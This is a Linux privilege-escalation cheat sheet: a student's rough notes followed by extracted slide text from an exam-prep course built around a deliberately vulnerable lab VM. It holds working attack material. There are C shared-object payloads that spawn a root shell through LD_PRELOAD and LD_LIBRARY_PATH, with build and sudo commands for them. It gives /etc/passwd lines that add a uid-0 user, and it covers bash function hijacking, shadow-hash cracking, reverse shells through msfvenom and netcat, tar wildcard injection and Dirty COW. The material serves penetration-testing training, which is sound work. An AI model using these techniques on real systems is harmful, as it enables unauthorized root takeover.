<br>	->create a fuction named the command in the current dir
<br>	eg if run program exist in /etc/run then create a function called /etc/run
<br>	cmd= $ function /etc/run { /bin/bash -p }
<br>	then cmd = $ export -f /etc/run
<br>	now run the the program again
<br>
<br>	-> if the current sh is lower than 4.4 we can use thiscmd to hyjack and run our commands
<br>	->env -i SHELLOPTS=xtrace PS4=<UR COMMAND> <full path of your program>
<br>use mthbernarels == rsg save the data
<br>
<br>use default credentials
<br>
<br>modify the cron job and hack
<br>
<br>	locatios of tabs
<br>		
<br>		->/var/spool/cron
<br>		->/var/spool/cron/crontabs 
<br>		->/etc/crontabs
<br>
<br>do  ls -la * in root directory to view all files and then look for unique file
<br>
<br>check for sudo privilage and suid suig and see https://gtfobins.github.io/ 
<br>
<br>see /etc/group (by default,a user's primary group has the same name
<br>
<br>see the program that is runing as root and try to exploit use cmd "ps aux | grep "^root"
<br>	->try ot find the version of the program using cmd "<program name> -v (or) --version"
<br>	->if it is debian also use "dpkg -l | grep <program"
<br>	->some os use "rpm -qa | grep <program>"
<br>
<br>in some programs the root shell will be running in loopback network so you can just port forward and then using ssh you can access it 
<br>	->client side cmd "ssh -R <local-port>:127.0.0.1:<service port> <username>@<our machine ip add> "
<br>	eg "ssh -R 4444(outport):127.0.0.1:3306(port where the service is runing) root@1.1.1.1(our ip add)"
<br>	->attacker machine (us) cmd "<program name> -u root -h 127.0.0.1 -P (port where we can find)"
<br>	eg mysql -u root -h 127.0.0.1 - 4444 
<br>
<br>if sudo is enable then check  gtfobins  (https://gtfobins.github.io/) or for the ld preload and ld library path
<br>	this is a shared object attack so you can do this https://www.youtube.com/watch?v=e9PmXlG0pyA
<br>
<br>	->first create a file and copy the c program
<br>		
<br>			for ld preload and save this file as shell.c
<br>
<br>				#include <stdio.h>
<br>				#include <sys/types.h>
<br>				#include <stdlib.h>
<br>				void _init() {
<br>				unsetenv("LD_PRELOAD");
<br>				setgid(0);
<br>				setuid(0);
<br>				system("/bin/sh");
<br>				}
<br>
<br>			then run this commands
<br>			
<br>			->gcc -fPIC -shared -o shell.so shell.c -nostartfiles
<br>			->ls -al shell.so
<br>			->sudo LD_PRELOAD=/tmp/shell.so <program which i can run as sudo>
<br>			->id
<br>			->whoami
<br>
<br>	->for ld library path you have to find the programs shared modules using this cmd  "ldd <full path of the program"
<br>
<br>		then replace any shared object shown with the same name using this progam compiled file
<br>			
<br>			for ld library path save it as the shared object to be replaced
<br>				
<br>				#include <stdio.h>
<br>				#include <sys/types.h>
<br>				#include <stdlib.h>
<br>				void _init() {
<br>				unsetenv("LD_LIBRARY_PATH");
<br>				setgid(0);
<br>				setuid(0);	
<br>				system("/bin/sh");
<br>				}
<br>
<br>			->gcc -fPIC -shared -o <name it as the shared object to be replaced>.so <name it as the shared object to be replaced>.c -nostartfiles
<br>			->ls -al <name it as the shared object to be replaced>.so
<br>			->sudo LD_PRELOAD=/tmp/<name it as the shared object to be replaced>.so <program which i can run as sudo>
<br>			->id
<br>			->whoami
<br>
<br>Are there any hashes in /etc/passwd? If so, can they be cracked quickly? (JtR, HashCat)
<br>
<br>Is /etc/shadow readable? If so, are the hashes easily crackable?
<br>
<br>Is /etc/passwd or /etc/shadow writeable?
<br>
<br>Any passwords in configuration or other files? Is the root password one of those?
<br>
<br>Does the current user have sudo rights at all? If so, how can they be abused?
<br>
<br>Check /home, /root, /etc/ssh for readable private ssh keys.
<br>
<br>Check /home, /root, /etc/ssh for writeable public ssh keys. (authorized_keys) . If not, can an authorized_keys file be created for another user?
<br>
<br>Kernel exploits?
<br>
<br>Check for SUID/SGID files that may give you read/write/execute access to sensitive files.
<br>
<br>Vulnerable/exploitable SUID/SGID executables.
<br>
<br>Vulnerable/exploitable files with special capabilities. (This is detailed here)
<br>
<br>Vulnerable/exploitable services running as another user/root, or that allow shell commands or other system access? (VNC as root for example)
<br>
<br>Are shell rc files (.bashrc, .zshrc, .profile, etc.) writeable? If so, malicious commands can be added to that file, will run when the user/root logs in.
<br>
<br>Writeable cron jobs, or other executables/scripts that are run by root.
<br>
<br>Replaceable/writeable modules/libraries that are used by privileged executables/scripts/processes.
<br>
<br>Writeable configuration files (*.conf) that are used by privileges executables/scripts/processes.
<br>
<br>Are there any interesting files in /var/mail/ or /home/*/? Any passwords or useful info in /home/*/.bash_history?
<br>
<br>
<br>look for the backup files and read them
<br>	->look here
<br>		/
<br>		/temp
<br>		/tmp
<br>		/var/backups
<br>		/home
<br>		/.ssh
<br>
<br>This course will be using the Debian VM from the following workshop: https://github.com/sagishahar/lpeworkshop
<br>The Debian VM has been intentionally misconfigured with numerous privilege escalation methods.
<br>The “user” account password is: password321 The “root” account password is: password123
<br>If for some reason you need to use the original VM, or perhaps you already have it set up, I have created a Bash script which integrates a few more misconfigurations into the VM: https://github.com/Tib3rius/privesc-setup
<br>Log onto the VM as the root user (root/password123) and run the script.
<br>This course was designed with the OSCP labs and exam in mind, however it attempts to cover a wide range of escalation techniques beyond what an OSCP student is expected to understand.
<br>Understanding that privilege escalation is often highly complex, and new techniques are developed over time, this course is not intended to be a “complete” guide to every privilege escalation technique.
<br>When appropriate, the author will update the course materials to include new techniques which are considered to be valuable.
<br>creating the Debian VM and privilege escalation workshop, and licensing it such that it could be used in this course.
<br>Showeet.com, for licensing the presentation template used in this course.
<br>Devand MacLean, for reviewing the course and suggesting several improvements.
<br>Our ultimate goal with privilege escalation in Linux is to gain a shell running as the root user.
<br>Privilege escalation can be simple (e.g. a kernel exploit) or require a lot of reconnaissance on the compromised system.
<br>In a lot of cases, privilege escalation may not simply rely on a single misconfiguration, but may require you to think, and combine multiple misconfigurations.
<br>General Concepts	(cont.)
<br>All privilege escalations are effectively examples of access control violations.
<br>Access control and user permissions are intrinsically linked.
<br>When focusing on privilege escalations in Linux, understanding how Linux handles permissions is very important.
<br>Users, Groups, and Files & Directories
<br>At a basic level, permissions in Linux are a relationship between users, groups, and files & directories.
<br>Users can belong to multiple groups. Groups can have multiple users.
<br>Every file and directory defines its permissions in terms of a user, a group, and “others” (all other users).
<br>Users
<br>User accounts are configured in the /etc/passwd file. User password hashes are stored in the /etc/shadow file. Users are identified by an integer user ID (UID).
<br>The “root” user account is a special type of account in Linux. It has an UID of 0, and the system grants this user access to every file.
<br>Groups are configured in the /etc/group file.
<br>Users have a primary group, and can have multiple secondary (or supplementary) groups.
<br>By default, a user’s primary group has the same name as their user account.
<br>All files & directories have a single owner and a group.
<br>Permissions are defined in terms of read, write, and execute operations.
<br>There are three sets of permissions, one for the owner, one for the group, and one for all “other” users (can also be referred to as “world”).
<br>Only the owner can change permissions.
<br>
<br>17
<br>File Permissions
<br>
<br>File permissions are self explanatory:
<br>        ◦ Read – when set, the file contents can be read.
<br>        ◦ Write – when set, the file contents can be modified.
<br>        ◦ Execute – when set, the file can be executed (i.e. run as some kind of process).
<br>
<br>
<br>
<br>
<br>
<br>18
<br>Directory Permissions
<br>
<br>Directory permissions are slightly more complicated:
<br>        ◦ Execute – when set, the directory can be entered. Without this permission, neither the read nor write permissions will work.
<br>        ◦ Read – when set, the directory contents can be listed.
<br>        ◦ Write – when set, files and subdirectories can be created in the directory.
<br>19
<br>Special Permissions
<br>
<br>setuid (SUID) bit
<br>When set, files will get executed with the privileges of the file owner.
<br>setgid (SGID) bit
<br>When set on a file, the file will get executed with the privileges of the file group.
<br>When set on a directory, files created within that directory will inherit the group of the directory itself.
<br>
<br>
<br>20
<br>Viewing Permissions
<br>
<br>The ls command can be used to view permissions:
<br>
<br>The first 10 characters indicate the permissions set on the file or directory.
<br>The first character simply indicates the type (e.g. '-' for file, 'd' for directory).
<br>21
<br>Viewing Permissions
<br>
<br>The remaining 9 characters represent the 3 sets of permissions (owner, group, others).
<br>Each set contains 3 characters, indicating the read (r), write (w), and execute (x) permissions.
<br>SUID/SGID permissions are represented by an 's' in the execute position.
<br>
<br>
<br>
<br>22
<br>
<br>
<br>
<br>Real, Effective, & Saved UID/GID
<br>
<br>I previously stated that users are identified by a user ID.
<br>In fact, each user has 3 user IDs in Linux (real, effective, and saved).
<br>A user’s real ID is who they actually are (the ID defined in
<br>/etc/passwd). Ironically, the real ID is actually used less often to check a user’s identity.
<br>Real, Effective, & Saved UID/GID
<br>
<br>A user’s effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user’s real ID.
<br>The effective ID is used in most access control decisions to verify a user, and commands such as whoami use the effective ID.
<br>Finally, the saved ID is used to ensure that SUID processes can temporarily switch a user’s effective ID back to their real ID and back again without losing track of the original effective ID.
<br>
<br>
<br>24
<br>Real, Effective, & Saved UID/GID
<br>
<br>Print real and effective user / group IDs:
<br>
<br>Print real, effective, saved, and file system user / group IDs of the current process (i.e. our shell):
<br>
<br>
<br>
<br>Uid:
<br>1000
<br>0
<br>0
<br>0
<br>Gid:
<br>1000
<br>0
<br>0
<br>0
<br>25
<br>
<br>
<br>Spawning Root Shells
<br>
<br>As stated in the introduction to this course, our ultimate goal is to spawn a root shell.
<br>While the end result is the same (executing /bin/sh or /bin/bash), there are multiple ways of achieving this execution.
<br>In this course, we will use a variety of methods. This section highlights a few which can be used in situations where commands can be executed as root.
<br>“rootbash” SUID
<br>
<br>One of my favorite ways to spawn a root shell is to create a copy of the /bin/bash executable file (I usually rename it rootbash), make sure it is owned by the root user, and has the SUID bit set.
<br>A root shell can be spawned by simply executing the rootbash file with the -p command line option.
<br>The benefit of this method is it is persistent (once you run the exploit, rootbash can be used multiple times).
<br>
<br>28
<br>Custom Executable
<br>
<br>There may be instances where some root process executes another process which you can control. In these cases, the following C code, once compiled, will spawn a Bash shell running as root:
<br>
<br>Compile using:
<br> $ gcc -o <name> <filename.c>	
<br>
<br>
<br>
<br>
<br>29
<br>msfvenom
<br>
<br>Alternatively, if a reverse shell is preferred, msfvenom
<br>can be used to generate an executable (.elf) file:
<br>
<br>
<br>This reverse shell can be caught using netcat or Metasploit’s own multi/handler.
<br>
<br>
<br>30
<br>Native Reverse Shells
<br>
<br>There are multiple ways to spawn reverse shells natively on many Linux distributions.
<br>A good tool for suggesting these is: https://github.com/mthbernardes/rsg
<br>All can be caught using a simple netcat listener.
<br>
<br>
<br>Why use tools?
<br>
<br>Tools allow us to automate the reconnaissance that can identify potential privilege escalations.
<br>While it is always important to understand what tools are doing, they are invaluable in a time-limited setting, such as an exam.
<br>In this course we will use Linux Smart Enumeration and LinEnum.
<br>
<br>
<br>
<br>Linux Smart Enumeration
<br>
<br>Linux Smart Enumeration (lse.sh) has recently become my personal favorite privilege escalation tool.
<br>In addition to being a Bash script (which helps if Python isn’t installed), it has multiple levels which gradually reveal more and more information.
<br>https://github.com/diego-treitos/linux-smart-enumeration
<br>
<br>
<br>
<br>LinEnum
<br>
<br>LinEnum is an advanced Bash script which extracts a large amount of useful information from the target system.
<br>It can copy interesting files for export, and search for files containing a keyword (e.g. “password”).
<br>
<br>https://github.com/rebootuser/LinEnum
<br>Other Tools
<br>
<br>While we won’t use these tools in the course, feel free to experiment with them:
<br>    • https://github.com/linted/linuxprivchecker
<br>    • https://github.com/AlessandroZ/BeRoot
<br>    • http://pentestmonkey.net/tools/audit/unix-privesc-check
<br>
<br>
<br>What is a Kernel?
<br>
<br>Kernels are the core of any operating system.
<br>Think of it as a layer between application software and the actual computer hardware.
<br>The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the root user.
<br>Finding Kernel Exploits
<br>
<br>Finding and using kernel exploits is usually a simple process:
<br>    1. Enumerate kernel version (uname -a).
<br>    2. Find matching exploits (Google, ExploitDB, GitHub).
<br>    3. Compile and run.
<br>Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.
<br>
<br>39
<br>Privilege Escalation
<br>
<br>    1. Enumerate the kernel version:
<br>
<br>    2. Use searchsploit to find matching exploits:
<br>
<br>
<br> # searchsploit linux kernel 2.6.32 priv esc	
<br>
<br>Note that none of the exploits match the distribution of Linux (Debian).
<br>
<br>
<br>40
<br>Privilege Escalation
<br>
<br>    3. We can try and adjust our search to be less specific with the kernel version, but more specific with the distribution:
<br>
<br> # searchsploit linux kernel 2.6 priv esc debian	
<br>
<br>Again, we get a few exploits that we can’t use for various reasons.
<br>    4. Install Linux Exploit Suggester 2 (https://github.com/jondonas/linux-exploit- suggester-2) and run the tool against the original kernel version:
<br>
<br> # ./linux-exploit-suggester-2.pl –k 2.6.32	
<br>
<br>This reveals a popular kernel exploit (Dirty COW).
<br>
<br>41
<br>Privilege Escalation
<br>
<br>    5. There are a number of Dirty COW exploits, all of which use different methods to obtain a root shell. The following version seems to work best on the practice VM: https://gist.github.com/KrE80r/42f8629577db95782d5e4f6 09f437a54
<br>    6. Download and compile it using the instructions in the file:
<br> $ gcc -pthread c0w.c -o c0w	
<br>
<br>
<br>
<br>42
<br>Privilege Escalation
<br>
<br>    7. Run the exploit:
<br>
<br>
<br> $ ./c0w	
<br>
<br>    8. Once the exploit is complete, simply execute the
<br>/usr/bin/passwd binary to get a root shell:
<br>
<br>Service Exploits
<br>
<br>Services are simply programs that run in the background, accepting input or performing regular tasks.
<br>If vulnerable services are running as root, exploiting them can lead to command execution as root.
<br>Service exploits can be found using Searchsploit, Google, and GitHub, just like with Kernel exploits.
<br>Services	Running as	Root
<br>
<br>The following command will show all processes that are running as root:
<br>
<br> $ ps aux | grep "^root"	
<br>
<br>With any results, try to identify the version number of the program being executed.
<br>
<br>46
<br>Enumerating Program Versions
<br>
<br>Running the program with the --version/-v command line option often shows the version number:
<br>
<br>On Debian-like distributions, dpkg can show installed programs and their version:
<br>
<br> $ dpkg -l | grep <program>	
<br>
<br>On systems that use rpm, the following achieves the same:
<br>
<br> $ rpm –qa | grep <program>	
<br>
<br>
<br>
<br>47
<br>Privilege Escalation
<br>
<br>    1. Enumerate the processes running as root:
<br>
<br>Note that the mysqld process is running as root.
<br>    2. Enumerate the version of mysqld:
<br>
<br>
<br>
<br>
<br>48
<br>Privilege Escalation
<br>
<br>    3. MySQL has the ability to install User Defined Functions (UDF) which run via shared objects.
<br>    4. Follow the instructions in this exploit to compile and install a UDF which executes system commands: https://www.exploit-db.com/exploits/1518
<br>Note: some commands may require slight modification.
<br>
<br>
<br>49
<br>Privilege Escalation
<br>
<br>    5. Once the UDF is installed, run the following command in the MySQL shell:
<br>
<br>    6. Drop back to our regular shell, and run /tmp/rootbash for a root shell:
<br>
<br>
<br>
<br>
<br>
<br>
<br>50
<br>Port Forwarding
<br>
<br>In some instances, a root process may be bound to an internal port, through which it communicates.
<br>If for some reason, an exploit cannot run locally on the target machine, the port can be forwarded using SSH to your local machine:
<br>
<br>
<br> $ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>	
<br>
<br>The exploit code can now be run on your local machine at whichever port you chose.
<br>
<br>weak File Permissions
<br>
<br>Certain system files can be taken advantage of to perform privilege escalation if the permissions on them are too weak.
<br>If a system file has confidential information we can read, it may be used to gain access to the root account.
<br>If a system file can be written to, we may be able to modify the way the operating system works and gain root access that way.
<br>53
<br>Useful Commands
<br>
<br>Find all writable files in /etc:
<br>
<br> $ find /etc -maxdepth 1 -writable -type f	
<br>
<br>Find all readable files in /etc:
<br>
<br> $ find /etc -maxdepth 1 -readable -type f	
<br>
<br>Find all directories which can be written to:
<br> $ find / -executable -writable -type d 2> /dev/null	
<br>
<br>
<br>54
<br>
<br>
<br>
<br>/etc/shadow
<br>
<br>The /etc/shadow file contains user password hashes, and by default is not readable by any user except for root.
<br>If we are able to read the contents of the /etc/shadow file, we might be able to crack the root user’s password hash.
<br>If we are able to modify the /etc/shadow file, we can replace the root user’s password hash with one we know.
<br>Privilege Escalation
<br>    1. Check the permissions of the /etc/shadow file: Note that it is world readable.
<br>    2. Extract the root user’s password hash:
<br>
<br>
<br>56
<br>Privilege Escalation
<br>
<br>    3. Save the password hash in a file (e.g. hash.txt):
<br>
<br>    4. Crack the password hash using john:
<br>
<br>
<br>57
<br>Privilege Escalation
<br>
<br>    5. Use the su command to switch to the root user, entering the password we cracked when prompted:
<br>
<br>
<br>
<br>58
<br>Privilege Escalation (#2)
<br>    1. Check the permissions of the /etc/shadow file: Note that it is world writable.
<br>    2. Copy / save the contents of /etc/shadow so we can restore it later.
<br>
<br>
<br>
<br>59
<br>Privilege Escalation (#2)
<br>
<br>    3. Generate a new SHA-512 password hash:
<br>
<br>
<br>    4. Edit the /etc/shadow and replace the root user’s password hash with the one we generated.
<br>
<br>
<br>60
<br>Privilege Escalation (#2)
<br>
<br>    5. Use the su command to switch to the root user, entering the new password when prompted:
<br>
<br>
<br>/etc/passwd
<br>
<br>The /etc/passwd historically contained user password hashes.
<br>For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow.
<br>If we can write to /etc/passwd, we can easily enter a known password hash for the root user, and then use the su command to switch to the root user.
<br>Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different.
<br>/etc/passwd
<br>
<br>The root account in /etc/passwd is usually configured like this:
<br>
<br> root:x:0:0:root:/root:/bin/bash	
<br>The “x” in the second field instructs Linux to look for the password hash in the /etc/shadow file.
<br>
<br>In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password:
<br>
<br> root::0:0:root:/root:/bin/bash	
<br>
<br>
<br>
<br>63
<br>Privilege Escalation
<br>
<br>    1. Check the permissions of the /etc/passwd file:
<br>
<br>Note that it is world writable.
<br>    2. Generate a password hash for the password “password” using openssl:
<br>
<br>
<br>64
<br>Privilege Escalation
<br>
<br>    3. Edit the /etc/passwd file and enter the hash in the second field of the root user row:
<br>
<br> root:L9yLGxncbOROc:0:0:root:/root:/bin/bash	
<br>
<br>    4. Use the su command to switch to the root user:
<br>
<br>65
<br>Privilege Escalation
<br>
<br>    5. Alternatively, append a new row to /etc/passwd to create an alternate root user (e.g. newroot):
<br>
<br> newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash	
<br>
<br>    6. Use the su command to switch to the newroot user:
<br>
<br>66
<br>
<br>
<br>
<br>Backups
<br>
<br>Even if a machine has correct permissions on important or sensitive files, a user may have created insecure backups of these files.
<br>It is always worth exploring the file system looking for readable backup files. Some common places include user home directories, the / (root) directory, /tmp, and /var/backups.
<br>Privilege Escalation
<br>
<br>    1. Look for interesting files, especially hidden files, in common locations:
<br>
<br>$ ls
<br>-la
<br>/home/user
<br>$ ls
<br>-la
<br>/
<br>$ ls
<br>-la
<br>/tmp
<br>$ ls
<br>-la
<br>/var/backups
<br>    2. Note that a hidden .ssh directory exists in the system root:
<br>
<br>
<br>
<br>
<br>68
<br>Privilege Escalation
<br>
<br>    3. In this directory, we can see a world-readable file called root_key:
<br>
<br>    4. Further inspection of this file seems to indicate that this is an SSH private key. The name and owner of the file suggests this key belongs to the root user:
<br>
<br>
<br>
<br>
<br>69
<br>Privilege Escalation
<br>
<br>    5. Before we try to use this key, let’s confirm that root logins are even allowed via SSH:
<br>
<br>    6. Copy the key over to your local machine, and give it correct permissions (otherwise SSH will refuse to use it):
<br>
<br> # chmod 600 root_key	
<br>
<br>
<br>
<br>
<br>
<br>
<br>70
<br>Privilege Escalation
<br>
<br>    7. Use the key to SSH to the target as the root account:
<br>
<br>72
<br>What is sudo?
<br>
<br>sudo is a program which lets users run other programs with the security privileges of other users. By default, that other user will be root.
<br>A user generally needs to enter their password to use sudo, and they must be permitted access via rule(s) in the /etc/sudoers file.
<br>Rules can be used to limit users to certain programs, and forgo the password entry requirement.
<br>
<br>73
<br>Useful Commands
<br>
<br>Run a program using sudo:
<br>
<br>
<br> $ sudo <program>	
<br>
<br>Run a program as a specific user:
<br>
<br>
<br> $ sudo –u <username> <program>	
<br>
<br>List programs a user is allowed (and disallowed) to run:
<br>
<br>
<br> $ sudo -l	
<br>
<br>74
<br>
<br>
<br>
<br>Known Password
<br>
<br>By far the most obvious privilege escalation with sudo is to use sudo as it was intended!
<br>If your low privileged user account can use sudo unrestricted (i.e. you can run any programs) and you know the user’s password, privilege escalation is easy, by using the “switch user” (su) command to spawn a root shell:
<br>
<br> $ sudo su	
<br>Other Methods
<br>
<br>If for some reason the su program is not allowed, there are many other ways to escalate privileges:
<br>
<br>
<br>$
<br>sudo
<br>-s
<br>$
<br>sudo
<br>-i
<br>$
<br>sudo
<br>/bin/bash
<br>$
<br>sudo
<br>passwd
<br>Even if there are no “obvious” methods for escalating privileges, we may be able to use a shell escape sequence.
<br>76
<br>
<br>
<br>
<br>Shell Escape Sequences
<br>
<br>Even if we are restricted to running certain programs via sudo, it is sometimes possible to “escape” the program and spawn a shell.
<br>Since the initial program runs with root privileges, so does the spawned shell.
<br>A list of programs with their shell escape sequences can be found here: https://gtfobins.github.io/
<br>Privilege Escalation (Generic)
<br>
<br>    1. List the programs your user is allowed to run via
<br>sudo:
<br>
<br>78
<br>Privilege Escalation (Generic)
<br>
<br>    2. For each program in the list, see if there is a shell escape sequence on GTFOBins (https://gtfobins.github.io/)
<br>    3. 	If an escape sequence exists, run the program via sudo and perform the sequence to spawn a root shell.
<br>
<br>79
<br>
<br>
<br>
<br>Abusing Intended Functionality
<br>
<br>If a program doesn’t have an escape sequence, it may still be possible to use it to escalate privileges.
<br>If we can read files owned by root, we may be able to extract useful information (e.g. passwords, hashes, keys).
<br>If we can write to files owned by root, we may be able to insert or modify information.
<br>Privilege Escalation
<br>
<br>    1. List the programs your user is allowed to run via sudo:
<br>
<br>Note that apache2 is in the list.
<br>    2. apache2 doesn’t have any known shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand.
<br>
<br>
<br>81
<br>Privilege Escalation
<br>
<br>    3. Run apache2 using sudo, and provide it the
<br>/etc/shadow file as a config file:
<br>
<br>    4. Extract the root user’s hash from the file.
<br>
<br>
<br>82
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>    5. Save the password hash in a file (e.g. hash.txt):
<br>
<br>    6. Crack the password hash using john:
<br>
<br>
<br>83
<br>Privilege Escalation
<br>
<br>    7. Use the su command to switch to the root user, entering the password we cracked when prompted:
<br>
<br>
<br>
<br>84
<br>
<br>
<br>
<br>Environment Variables
<br>
<br>Programs run through sudo can inherit the environment variables from the user’s environment.
<br>In the /etc/sudoers config file, if the env_reset option is set, sudo will run programs in a new, minimal environment.
<br>The env_keep option can be used to keep certain environment variables from the user’s environment.
<br>The configured options are displayed when running sudo -l
<br>
<br>
<br>
<br>LD_PRELOAD
<br>
<br>LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file.
<br>When set, the shared object will be loaded before any others.
<br>By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.
<br>Limitations
<br>
<br>LD_PRELOAD will not work if the real user ID is different from the effective user ID.
<br>sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option.
<br>
<br>
<br>87
<br>Privilege Escalation
<br>
<br>    1. List the programs your user is allowed to run via
<br>sudo:
<br>
<br>Note that the env_keep option includes the LD_PRELOAD environment variable.
<br>
<br>
<br>88
<br>Privilege Escalation
<br>
<br>    2. Create a file (preload.c) with the following contents:
<br>
<br>
<br>89
<br>Privilege Escalation
<br>
<br>    3. Compile preload.c to preload.so:
<br>
<br> $ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c	
<br>    4. Run any allowed program using sudo, while setting the LD_PRELOAD environment variable to the full path of the preload.so file:
<br>
<br>90
<br>
<br>
<br>LD_LIBRARY_PATH
<br>
<br>The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.
<br>The ldd command can be used to print the shared libraries used by a program:
<br>
<br> $ ldd /usr/sbin/apache2	
<br>
<br>By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.
<br>Privilege Escalation
<br>
<br>    1. Run ldd against the apache2 program file:
<br>
<br>Hijacking shared objects using this method is hit or miss. Choose one from the list and try it (libcrypt.so.1 seems to work well).
<br>
<br>92
<br>Privilege Escalation
<br>
<br>    2. Create a file (library_path.c) with the following contents:
<br>
<br>
<br>
<br>93
<br>Privilege Escalation
<br>
<br>    3. Compile library_path.c into libcrypt.so.1:
<br>
<br> $ gcc -o libcrypt.so.1 -shared -fPIC library_path.c	
<br>    4. Run apache2 using sudo, while setting the LD_LIBRARY_PATH environment variable to the current path (where we compiled library_path.c):
<br>
<br>
<br>Cron Jobs
<br>
<br>Cron jobs are programs or scripts which users can schedule to run at specific times or intervals.
<br>Cron jobs run with the security level of the user who owns them.
<br>By default, cron jobs are run using the /bin/sh shell, with limited environment variables.
<br>Cron Jobs
<br>
<br>Cron table files (crontabs) store the configuration for cron jobs.
<br>User crontabs are usually located in /var/spool/cron/ or
<br>/var/spool/cron/crontabs/
<br>The system-wide crontab is located at /etc/crontab.
<br>
<br>
<br>
<br>97
<br>
<br>
<br>
<br>File Permissions
<br>
<br>Misconfiguration of file permissions associated with cron jobs can lead to easy privilege escalation.
<br>If we can write to a program or script which gets run as part of a cron job, we can replace it with our own code.
<br>Privilege Escalation
<br>
<br>    1. View the contents of the system-wide crontab:
<br>
<br>    2. Locate the overwrite.sh file on the server:
<br>
<br>Privilege Escalation
<br>
<br>    3. Check the file’s permissions:
<br>
<br>Note that the file is world writable.
<br>    4. Replace the contents of the overwrite.sh file with the following:
<br>Privilege Escalation
<br>
<br>    5. Run a netcat listener on your local machine and wait for the cron job to run. A reverse shell running as the root user should be caught:
<br>
<br>PATH Environment Variable
<br>
<br>The crontab PATH environment variable is by default set to
<br>/usr/bin:/bin
<br>The PATH variable can be overwritten in the crontab file.
<br>If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.
<br>Privilege Escalation
<br>
<br>    1. View the contents of the system-wide crontab:
<br>
<br>Note that the /home/user directory (which we can write to) is at the start of the PATH variable, and the first cron job does not use an absolute path.
<br>
<br>Privilege Escalation
<br>
<br>    2. Create the file overwrite.sh in /home/user with the following contents:
<br>
<br>    3. Ensure that overwrite.sh is executable:
<br> $ chmod +x /home/user/overwrite.sh	
<br>
<br>Privilege Escalation
<br>
<br>    4. Wait for the cronjob to run (this job in particular runs every minute).
<br>    5. Once the /tmp/rootbash file is created, execute it (with
<br>-p to preserve the effective UID) to gain a root shell:
<br>
<br>Wildcards
<br>
<br>When a wildcard character (*) is provided to a command as part of an argument, the shell will first perform filename expansion (also known as globbing) on the wildcard.
<br>This process replaces the wildcard with a space-separated list of the file and directory names in the current directory.
<br>An easy way to see this in action is to run the following command from your home directory:
<br>
<br> $ echo *	
<br>Wildcards & Filenames
<br>
<br>Since filesystems in Linux are generally very permissive with filenames, and filename expansion happens before the command is executed, it is possible to pass command line options (e.g. -h, --help) to commands by creating files with these names.
<br>The following commands should show how this works:
<br>
<br>Wildcards & Filenames (cont.)
<br>
<br>Filenames are not simply restricted to simple options like -h or
<br>--help.
<br>In fact we can create filenames that match complex options:
<br>--option=key=value
<br>GTFOBins (https://gtfobins.github.io) can help determine whether a command has command line options which will be useful for our purposes.
<br>
<br>Privilege Escalation
<br>
<br>    1. View the contents of the system-wide crontab:
<br>
<br>    2. View the contents of the /usr/local/bin/compress.sh file:
<br>
<br>Note that the tar command is run with a wildcard in the /home/user directory.
<br>
<br>Privilege Escalation
<br>
<br>    3. GTFOBins shows that tar has command line options which can be used to run other commands as part of a checkpoint feature.
<br>    4. Use msfvenom to create a reverse shell ELF payload:
<br>
<br>Privilege Escalation
<br>
<br>    5. Copy the file to the /home/user directory on the remote host.
<br>    6. Create two files in the /home/user directory:
<br>
<br>Privilege Escalation
<br>
<br>    7. Run a netcat listener on your local machine and wait for the cron job to run. A reverse shell running as the root user should be caught:
<br>
<br>SUID / SGID Files
<br>
<br>SUID files get executed with the privileges of the file owner.
<br>SGID files get executed with the privileges of the file group.
<br>If the file is owned by root, it gets executed with root privileges, and we may be able to use it to escalate privileges.
<br>Finding SUID / SGID Files
<br>
<br>We can use the following find command to locate files with the SUID or SGID bits set:
<br>
<br>$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
<br>-rwxr-sr-x 1 root shadow 19528 Feb 15	2011 /usr/bin/expiry
<br>-rwxr-sr-x 1 root ssh 108600 Apr	2	2014 /usr/bin/ssh-agent
<br>-rwsr-xr-x 1 root root 37552 Feb 15	2011 /usr/bin/chsh
<br>-rwsr-xr-x 2 root root 168136 Jan	5	2016 /usr/bin/sudo
<br>
<br>-rwxr-sr-x
<br>1
<br>root
<br>tty 11000 Jun 17	2010 /usr/bin/bsd-write
<br>-rwxr-sr-x
<br>...
<br>1
<br>root
<br>crontab 35040 Dec 18	2010 /usr/bin/crontab
<br>
<br>115
<br>
<br>
<br>
<br>Shell Escape Sequences
<br>
<br>Just as we were able to use shell escape sequences with programs running via sudo, we can do the same with SUID / SGID files.
<br>A list of programs with their shell escape sequences can be found here: https://gtfobins.github.io/
<br>Refer to the previous section on shell escape sequences for how to use them.
<br>A Quick Word on LD_PRELOAD & LD_LIBRARY_PATH
<br>You may be thinking: why we can’t just use the same LD_PRELOAD and LD_LIBRARY_PATH environment variable tricks we used with sudo privilege escalation?
<br>By default, this is disabled in Linux, due to the obvious security risk it presents!
<br>Both these environment variables get ignored when SUID files are executed.
<br>
<br>117
<br>
<br>
<br>
<br>Known Exploits
<br>
<br>Certain programs install SUID files to aid their operation.
<br>Just as services which run as root can have vulnerabilities we can exploit for a root shell, so too can these SUID files.
<br>Exploits can be found using Searchsploit, Google, and GitHub, in the same way we find exploits for Kernels and Services.
<br>Privilege Escalation
<br>
<br>    1. Find SUID/SGID files on the target:
<br>
<br>
<br>Exim is a popular mail transfer agent that is somewhat notorious for having many security vulnerabilities.
<br>
<br>
<br>119
<br>Privilege Escalation
<br>
<br>    2. The version of exim is rather obvious from the filename, however we can confirm it:
